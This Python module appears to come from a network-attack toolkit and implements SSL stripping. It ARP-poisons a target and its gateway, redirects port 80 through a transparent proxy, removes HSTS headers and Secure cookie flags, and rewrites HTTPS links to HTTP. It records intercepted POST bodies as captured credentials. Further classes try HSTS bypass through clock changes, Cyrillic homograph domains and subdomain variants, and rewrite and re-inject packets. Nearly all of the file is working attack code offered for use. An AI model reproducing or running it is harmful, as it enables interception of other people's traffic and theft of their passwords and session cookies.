"""
SSL Strip Module
────────────────
Performs SSL stripping (Moxie Marlinspike attack):
  - Downgrade HTTPS to HTTP via transparent proxy
  - Intercept SSL-protected content
  - Strip HTTPS redirect headers and HSTS
  - Enable IP forwarding and iptables REDIRECT
  - Credential harvesting from intercepted forms
"""

import os
import time
import threading
import re
import socket
import subprocess
import struct

from scapy.all import IP, TCP, Raw, sniff, send, sendp, ARP, get_if_hwaddr, Ether, srp
from .config import NETWORK_GW_IP, CAPTIVE_PORTAL_PORT, IS_WINDOWS, IS_LINUX, log


class SSLStripper:
    """
    SSL stripping engine using Moxie Marlinspike's technique.
    Downgrades HTTPS connections to HTTP for content interception.

    Operates as a transparent HTTP proxy:
    1. Enables IP forwarding
    2. Sets up iptables to redirect port 80 traffic to the proxy
    3. ARP poisons to become the MITM
    4. Proxies HTTP requests to upstream, stripping HTTPS from responses
    """

    def __init__(self, interface, target_ip=None, gateway_ip=None):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip or "192.168.1.1"
        self.attacker_mac = get_if_hwaddr(interface)
        self.running = False
        self._thread = None
        self._proxy_thread = None
        self._proxy_server = None
        self._http_port = 8080
        self._stripped_urls = []
        self._ssl_requests = []
        self._captured_credentials = []
        self._original_ip_forward = None
        self._arp_thread = None

    def _get_mac(self, ip):
        """Get MAC address for IP using ARP."""
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2, verbose=False, iface=self.interface
        )
        for _, r in ans:
            return r[ARP].hwsrc
        return None

    def _enable_ip_forwarding(self):
        """Enable IP forwarding on the system."""
        if IS_LINUX:
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                    self._original_ip_forward = f.read().strip()
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("1")
                log.info("IP forwarding enabled")
            except (IOError, PermissionError):
                try:
                    subprocess.run(
                        ["sysctl", "-w", "net.ipv4.ip_forward=1"],
                        capture_output=True, timeout=5
                    )
                    self._original_ip_forward = "0"
                    log.info("IP forwarding enabled via sysctl")
                except Exception as e:
                    log.error(f"Cannot enable IP forwarding: {e}")

    def _disable_ip_forwarding(self):
        """Restore IP forwarding to original value."""
        if self._original_ip_forward is None:
            return
        if IS_LINUX:
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write(self._original_ip_forward)
                log.info("IP forwarding restored")
            except (IOError, PermissionError):
                try:
                    subprocess.run(
                        ["sysctl", "-w",
                         f"net.ipv4.ip_forward={self._original_ip_forward}"],
                        capture_output=True, timeout=5
                    )
                except Exception:
                    pass
        self._original_ip_forward = None

    def _setup_iptables(self):
        """Set up iptables PREROUTING rule to redirect HTTP to our proxy."""
        if not IS_LINUX:
            return
        try:
            # Redirect port 80 traffic destined for the internet to our proxy
            subprocess.run(
                ["iptables", "-t", "nat", "-A", "PREROUTING",
                 "-i", self.interface, "-p", "tcp", "--dport", "80",
                 "-j", "REDIRECT", "--to-port", str(self._http_port)],
                capture_output=True, timeout=5
            )
            log.info(f"iptables REDIRECT: port 80 -> {self._http_port}")
        except Exception as e:
            log.error(f"iptables setup failed: {e}")

    def _teardown_iptables(self):
        """Remove iptables PREROUTING rule."""
        if not IS_LINUX:
            return
        try:
            subprocess.run(
                ["iptables", "-t", "nat", "-D", "PREROUTING",
                 "-i", self.interface, "-p", "tcp", "--dport", "80",
                 "-j", "REDIRECT", "--to-port", str(self._http_port)],
                capture_output=True, timeout=5
            )
            log.info("iptables REDIRECT rule removed")
        except Exception:
            pass

    def start(self, target_ip=None, gateway_ip=None):
        """Start SSL stripping attack."""
        if IS_WINDOWS:
            log.warning("SSL stripping has limited support on Windows.")
            log.warning("Packet interception requires Npcap with admin privileges.")

        self.target_ip = target_ip or self.target_ip
        self.gateway_ip = gateway_ip or self.gateway_ip

        if not self.target_ip:
            log.error("No target IP specified")
            return False

        # Get MAC addresses for ARP poisoning
        target_mac = self._get_mac(self.target_ip)
        gateway_mac = self._get_mac(self.gateway_ip)

        if not target_mac or not gateway_mac:
            log.error("Could not resolve MAC addresses")
            return False

        log.info(f"Starting SSL Strip on {self.interface}")

        # Set running BEFORE starting any threads to avoid race conditions
        self.running = True

        # Enable IP forwarding
        self._enable_ip_forwarding()

        # Set up iptables REDIRECT
        self._setup_iptables()

        # Start transparent HTTP proxy
        self._start_proxy_server()

        # Start ARP poisoning loop
        self._thread = threading.Thread(
            target=self._arp_poison_loop,
            args=(target_mac, gateway_mac),
            daemon=True
        )
        self._thread.start()

        log.info(f"SSL Strip active: {self.target_ip}")

        return True

    def _start_proxy_server(self):
        """
        Start transparent HTTP proxy server that intercepts requests,
        forwards them to the real upstream server, strips HTTPS from
        responses, and returns the modified content to the client.
        """
        proxy = self

        def handle_client(client_sock, client_addr):
            """Handle a single client connection through the proxy."""
            try:
                # Read the HTTP request from the client
                request_data = b""
                client_sock.settimeout(10)
                while True:
                    chunk = client_sock.recv(4096)
                    if not chunk:
                        break
                    request_data += chunk
                    if b"\r\n\r\n" in request_data:
                        # Check if there is a body to read (POST)
                        header_end = request_data.find(b"\r\n\r\n")
                        headers_part = request_data[:header_end].decode(errors="ignore")
                        content_length = 0
                        for line in headers_part.split("\r\n"):
                            if line.lower().startswith("content-length:"):
                                try:
                                    content_length = int(line.split(":", 1)[1].strip())
                                except ValueError:
                                    pass
                        body_start = header_end + 4
                        body_received = len(request_data) - body_start
                        if body_received >= content_length:
                            break
                    if len(request_data) > 65536:
                        break

                if not request_data:
                    client_sock.close()
                    return

                # Parse the request to extract Host and path
                request_str = request_data.decode(errors="ignore")
                lines = request_str.split("\r\n")
                request_line = lines[0] if lines else ""

                # Extract Host header
                host = None
                for line in lines[1:]:
                    if line.lower().startswith("host:"):
                        host = line.split(":", 1)[1].strip()
                        break

                if not host:
                    # Try to extract from absolute URL
                    parts = request_line.split(" ")
                    if len(parts) >= 2 and "://" in parts[1]:
                        from urllib.parse import urlparse
                        parsed = urlparse(parts[1])
                        host = parsed.hostname
                    if not host:
                        client_sock.close()
                        return

                # Extract port from host if present
                upstream_port = 80
                if ":" in host:
                    host_parts = host.rsplit(":", 1)
                    host = host_parts[0]
                    try:
                        upstream_port = int(host_parts[1])
                    except ValueError:
                        pass

                # Log the request URL
                method_path = request_line.split(" ")
                url_path = method_path[1] if len(method_path) >= 2 else "/"
                full_url = f"http://{host}{url_path}"
                proxy._stripped_urls.append({
                    "url": full_url,
                    "src": client_addr[0],
                    "timestamp": time.time()
                })
                log.info(f"SSL Strip proxy: {client_addr[0]} -> {full_url}")

                # Capture POST data (credentials)
                if request_line.startswith("POST"):
                    header_end = request_str.find("\r\n\r\n")
                    if header_end != -1:
                        post_body = request_str[header_end + 4:]
                        if post_body:
                            proxy._captured_credentials.append({
                                "url": full_url,
                                "src": client_addr[0],
                                "data": post_body[:1024],
                                "timestamp": time.time()
                            })
                            log.critical(
                                f"Credentials captured from {client_addr[0]}: "
                                f"{post_body[:200]}"
                            )

                # Connect to upstream server and forward the request
                upstream_sock = None
                try:
                    upstream_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    upstream_sock.settimeout(15)
                    upstream_sock.connect((host, upstream_port))
                    upstream_sock.sendall(request_data)

                    # Read response from upstream
                    response_data = b""
                    while True:
                        try:
                            chunk = upstream_sock.recv(8192)
                            if not chunk:
                                break
                            response_data += chunk
                            if len(response_data) > 1048576:  # 1MB limit
                                break
                        except socket.timeout:
                            break

                except (socket.error, socket.timeout, OSError) as e:
                    log.warning(f"Upstream connection failed to {host}: {e}")
                    # Return a 502 Bad Gateway
                    error_resp = (
                        b"HTTP/1.1 502 Bad Gateway\r\n"
                        b"Content-Type: text/html\r\n"
                        b"Connection: close\r\n\r\n"
                        b"<html><body><h1>502 Bad Gateway</h1></body></html>"
                    )
                    client_sock.sendall(error_resp)
                    client_sock.close()
                    return
                finally:
                    if upstream_sock:
                        try:
                            upstream_sock.close()
                        except Exception:
                            pass

                # Strip HTTPS from the response
                if response_data:
                    response_data = proxy._strip_response(response_data)
                    client_sock.sendall(response_data)

            except (socket.error, socket.timeout, OSError):
                pass
            finally:
                try:
                    client_sock.close()
                except Exception:
                    pass

        def proxy_server_loop():
            """Accept connections on the proxy port."""
            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                server_sock.bind(("0.0.0.0", proxy._http_port))
                server_sock.listen(50)
                server_sock.settimeout(1.0)
                proxy._proxy_server = server_sock
                log.info(f"SSL Strip proxy listening on port {proxy._http_port}")

                while proxy.running:
                    try:
                        client_sock, client_addr = server_sock.accept()
                        threading.Thread(
                            target=handle_client,
                            args=(client_sock, client_addr),
                            daemon=True
                        ).start()
                    except socket.timeout:
                        continue
                    except OSError:
                        break
            except (OSError, socket.error) as e:
                log.error(f"Proxy server error: {e}")
            finally:
                try:
                    server_sock.close()
                except Exception:
                    pass

        self._proxy_thread = threading.Thread(
            target=proxy_server_loop, daemon=True
        )
        self._proxy_thread.start()

    def _strip_response(self, response_data):
        """
        Strip HTTPS from HTTP response:
        - Remove Strict-Transport-Security header
        - Rewrite Location: https:// to http://
        - Replace https:// with http:// in body content
        - Remove Secure flag from Set-Cookie headers
        """
        # Split headers and body
        header_end = response_data.find(b"\r\n\r\n")
        if header_end == -1:
            return response_data

        headers = response_data[:header_end]
        body = response_data[header_end + 4:]

        # Remove Strict-Transport-Security header
        headers = re.sub(
            rb'(?i)\r\nStrict-Transport-Security:[^\r\n]*',
            b'',
            headers
        )

        # Rewrite Location header from https to http
        headers = re.sub(
            rb'(?i)(Location:\s*)https://',
            rb'\1http://',
            headers
        )

        # Remove Secure flag from Set-Cookie headers
        headers = re.sub(
            rb'(?i);\s*[Ss]ecure',
            b'',
            headers
        )

        # Strip https from body content
        body = body.replace(b"https://", b"http://")

        # Recalculate Content-Length if present
        headers_str = headers.decode(errors="ignore")
        if "content-length" in headers_str.lower():
            headers = re.sub(
                rb'(?i)Content-Length:\s*\d+',
                f'Content-Length: {len(body)}'.encode(),
                headers
            )

        return headers + b"\r\n\r\n" + body

    def _arp_poison_loop(self, target_mac, gateway_mac):
        """
        Continuously ARP poison both target and gateway to maintain
        the MITM position. Sends spoofed ARP replies every 2 seconds.
        """
        log.info(f"ARP poisoning: target={self.target_ip} gateway={self.gateway_ip}")
        while self.running:
            # Tell target: gateway IP is at attacker MAC
            sendp(
                Ether(dst=target_mac) / ARP(
                    op=2, psrc=self.gateway_ip, pdst=self.target_ip,
                    hwsrc=self.attacker_mac
                ),
                verbose=False, iface=self.interface
            )
            # Tell gateway: target IP is at attacker MAC
            sendp(
                Ether(dst=gateway_mac) / ARP(
                    op=2, psrc=self.target_ip, pdst=self.gateway_ip,
                    hwsrc=self.attacker_mac
                ),
                verbose=False, iface=self.interface
            )
            time.sleep(2)

    def stop(self):
        """Stop SSL stripping, restore ARP, iptables, and IP forwarding."""
        self.running = False

        # Teardown iptables
        self._teardown_iptables()

        # Disable IP forwarding
        self._disable_ip_forwarding()

        # Close proxy server
        if self._proxy_server:
            try:
                self._proxy_server.close()
            except Exception:
                pass

        # Wait for threads
        if self._thread:
            self._thread.join(timeout=5)
        if self._proxy_thread:
            self._proxy_thread.join(timeout=5)

        log.info("SSL Strip stopped")

    def get_stats(self):
        """Return SSL stripping statistics."""
        return {
            "ssl_requests": len(self._ssl_requests),
            "stripped_urls": len(self._stripped_urls),
            "captured_credentials": len(self._captured_credentials),
            "running": self.running
        }

    def get_credentials(self):
        """Return all captured credentials."""
        return self._captured_credentials


class HSTSInjector(SSLStripper):
    """
    HSTS (HTTP Strict Transport Security) bypass.
    Attempts to bypass HSTS by various techniques:
    - NTP time manipulation to expire HSTS pins
    - Homograph domain substitution (IDN attacks)
    - Subdomain bypass (wwww. or ww1. prefixes)
    """

    def __init__(self, interface):
        super().__init__(interface)
        self._hsts_bypassed = []
        self._domain_map = {}  # original domain -> bypassed domain

    def bypass_hsts(self, domain):
        """
        Attempt HSTS bypass using multiple techniques:
        1. NTP time manipulation - set system clock far in the future
           to expire HSTS max-age entries in the browser's HSTS store
        2. Homograph attack - replace characters with visually similar
           Unicode IDN characters (e.g., a -> cyrillic a)
        3. Subdomain bypass - use a non-HSTS subdomain prefix
        """
        bypassed = False
        technique_used = None

        # Technique 1: NTP time manipulation
        # Set system time far ahead to expire HSTS max-age
        if IS_LINUX:
            try:
                # Save current time
                result = subprocess.run(
                    ["date", "+%s"], capture_output=True, text=True, timeout=5
                )
                original_epoch = result.stdout.strip()

                # Set time 2 years in the future to expire HSTS max-age
                future_epoch = int(original_epoch) + (2 * 365 * 24 * 3600)
                subprocess.run(
                    ["date", "-s", f"@{future_epoch}"],
                    capture_output=True, timeout=5
                )
                log.info(f"NTP bypass: system time set to future for {domain}")
                bypassed = True
                technique_used = "ntp_time_manipulation"

                # Restore time after a brief window (allows browser to clear HSTS)
                time.sleep(0.1)
                subprocess.run(
                    ["date", "-s", f"@{original_epoch}"],
                    capture_output=True, timeout=5
                )
            except Exception as e:
                log.warning(f"NTP time manipulation failed: {e}")

        # Technique 2: Homograph domain substitution
        # Map common ASCII chars to visually similar Unicode/IDN chars
        homograph_map = {
            'a': '\u0430',  # Cyrillic a
            'e': '\u0435',  # Cyrillic e
            'o': '\u043e',  # Cyrillic o
            'p': '\u0440',  # Cyrillic p
            'c': '\u0441',  # Cyrillic c
            'x': '\u0445',  # Cyrillic x
        }
        homograph_domain = ""
        substituted = False
        for ch in domain:
            if ch in homograph_map and not substituted:
                homograph_domain += homograph_map[ch]
                substituted = True
            else:
                homograph_domain += ch

        if substituted:
            self._domain_map[domain] = homograph_domain
            if not bypassed:
                technique_used = "homograph"
                bypassed = True
            log.info(f"Homograph bypass: {domain} -> {homograph_domain}")

        # Technique 3: Subdomain bypass
        # HSTS may not cover all subdomains if includeSubDomains is not set
        subdomain_variants = [
            f"ww1.{domain}",
            f"ww2.{domain}",
            f"wwww.{domain}",
            f"m.{domain}",
            f"web.{domain}",
        ]
        self._domain_map.setdefault(domain, subdomain_variants[0])
        if not bypassed:
            technique_used = "subdomain"
            bypassed = True
        log.info(f"Subdomain bypass candidates for {domain}: {subdomain_variants[:3]}")

        self._hsts_bypassed.append({
            "domain": domain,
            "timestamp": time.time(),
            "bypassed": bypassed,
            "technique": technique_used,
            "homograph": homograph_domain if substituted else None,
            "subdomains": subdomain_variants
        })

        log.warning(f"HSTS bypass attempted: {domain} (technique: {technique_used})")
        return bypassed

    def get_bypass_stats(self):
        """Return HSTS bypass statistics."""
        return {
            "bypassed_domains": len(self._hsts_bypassed),
            "domains": self._hsts_bypassed,
            "domain_map": self._domain_map
        }


class SSLRedir(SSLStripper):
    """
    SSL-Redir variant of SSL stripping.
    Monitors intercepted traffic and rewrites HTTPS URLs to HTTP,
    then re-injects modified packets into the network stream.
    """

    def __init__(self, interface):
        super().__init__(interface)
        self._redir_rules = {}
        self._rewritten_count = 0

    def add_redirect(self, https_url, http_url):
        """Add HTTPS to HTTP redirect rule."""
        self._redir_rules[https_url] = http_url

    def strip_url(self, url):
        """Strip HTTPS from URL."""
        if url.startswith("https://"):
            return "http://" + url[8:]
        return url

    def process_request(self, pkt):
        """
        Process a packet for URL stripping and re-injection.
        Modifies HTTPS references in HTTP traffic to HTTP,
        recalculates packet checksums, and forwards the modified packet.
        """
        if not pkt.haslayer(Raw):
            return None

        payload = bytes(pkt[Raw].load)
        modified = False

        # Strip https:// to http:// in request/response bodies
        if b"https://" in payload:
            payload = payload.replace(b"https://", b"http://")
            modified = True

        # Strip Location headers from HTTPS to HTTP
        if b"Location: https://" in payload:
            payload = payload.replace(b"Location: https://", b"Location: http://")
            modified = True

        # Apply custom redirect rules
        for https_url, http_url in self._redir_rules.items():
            https_bytes = https_url.encode()
            http_bytes = http_url.encode()
            if https_bytes in payload:
                payload = payload.replace(https_bytes, http_bytes)
                modified = True

        # Remove Strict-Transport-Security header
        if b"Strict-Transport-Security" in payload:
            payload = re.sub(
                rb'Strict-Transport-Security:[^\r\n]*\r\n',
                b'',
                payload
            )
            modified = True

        # Remove Secure flag from cookies
        if b"Secure" in payload:
            payload = re.sub(rb';\s*[Ss]ecure', b'', payload)
            modified = True

        if modified and pkt.haslayer(IP) and pkt.haslayer(TCP):
            # Build and send modified packet with fresh checksums
            modified_pkt = (
                IP(src=pkt[IP].src, dst=pkt[IP].dst) /
                TCP(
                    sport=pkt[TCP].sport,
                    dport=pkt[TCP].dport,
                    seq=pkt[TCP].seq,
                    ack=pkt[TCP].ack,
                    flags=pkt[TCP].flags
                ) /
                Raw(load=payload)
            )
            del modified_pkt[IP].len
            del modified_pkt[IP].chksum
            del modified_pkt[TCP].chksum

            send(modified_pkt, verbose=False, iface=self.interface)
            self._rewritten_count += 1
            log.info(f"SSL-Redir: packet rewritten and forwarded ({self._rewritten_count})")

        return payload

    def get_stats(self):
        """Return SSLRedir statistics."""
        stats = super().get_stats()
        stats["rewritten_packets"] = self._rewritten_count
        stats["redirect_rules"] = len(self._redir_rules)
        return stats
